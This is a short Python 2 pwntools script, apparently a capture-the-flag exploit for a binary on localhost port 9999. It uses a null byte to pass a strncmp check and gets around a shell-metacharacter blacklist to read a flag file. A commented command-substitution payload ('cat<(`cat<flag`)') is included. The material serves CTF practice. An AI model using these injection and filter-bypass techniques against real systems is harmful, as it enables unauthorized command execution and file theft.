#!/usr/bin/env python2
from pwn import *


# step1: strncmpy bug: '\0'
# step2: split('-',';','|','&',' ','\t','\r','\n','\'','"')
# step3: man + input
#man ./flag.txt


context(os='linux', arch='i386')
#context.log_level = 'debug'
#r = process('./exp100')
r=remote('127.0.0.1','9999')
#gdb.attach(r, '''
#break * main+360
#break * main +718
#break * main +800
#c
#''')
try:
	pl="\x00"*2
	r.sendline(pl)
	r.send("./flag")
	#r.send("cat<(`cat<flag`)")
	#print  r.recv()
	r.interactive()
except Exception,e:
	print e



